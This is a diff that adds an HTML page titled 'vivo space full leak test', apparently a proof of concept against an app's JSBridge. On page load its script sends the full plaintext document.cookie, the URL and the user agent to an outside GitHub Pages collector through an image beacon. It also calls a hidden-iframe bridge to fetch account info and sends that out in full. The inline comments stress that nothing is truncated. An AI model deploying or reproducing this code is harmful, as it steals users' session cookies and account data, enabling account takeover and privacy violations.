@@ -1,0 +1,59 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>vivo space full leak test</title>
+</head>
+<body>
+<script>
+// 直接返回完整 Cookie，不截断、不统计长度
+function summarizeCookie(raw) {
+  return raw || ''; // 👈 只改这里：直接返回原文
+}
+
+// 发送数据（不变）
+function send(path, params) {
+  var q = Object.keys(params).map(function (k) {
+    return encodeURIComponent(k) + '=' + encodeURIComponent(params[k] || '');
+  }).join('&');
+  new Image().src = path + '?' + q + '&t=' + Date.now();
+}
+
+// 上报：明文 Cookie
+send('https://allen10086.github.io/collect.gif', {
+  stage: 'page_loaded',
+  cookie: summarizeCookie(document.cookie), // 👈 完整明文Cookie
+  href: location.href,
+  ua: navigator.userAgent // 👈 直接上传完整UA
+});
+
+// 回调：直接上报完整账号信息（明文）
+window.cb_account = function (v) {
+  var s = typeof v === 'string' ? v : JSON.stringify(v);
+  send('https://allen10086.github.io/collect.gif', {
+    stage: 'getAccountInfo',
+    data: s, // 👈 完整账号信息（明文）
+    len: s.length
+  });
+};
+
+// JSBridge 调用（不变）
+function bridge(handler, data, callback) {
+  var url = 'jsbridge://javacall/' + handler +
+    '?data=' + encodeURIComponent(JSON.stringify(data || {})) +
+    '&callback=' + encodeURIComponent(callback);
+  var f = document.createElement('iframe');
+  f.style.display = 'none';
+  f.src = url;
+  document.body.appendChild(f);
+  setTimeout(function () { try { f.remove(); } catch(e) {} }, 2000);
+}
+
+// 延迟获取账号信息（不变）
+setTimeout(function () {
+  bridge('getAccountInfo', {}, 'cb_account');
+}, 1000);
+</script>
+ok
+</body>
+</html>
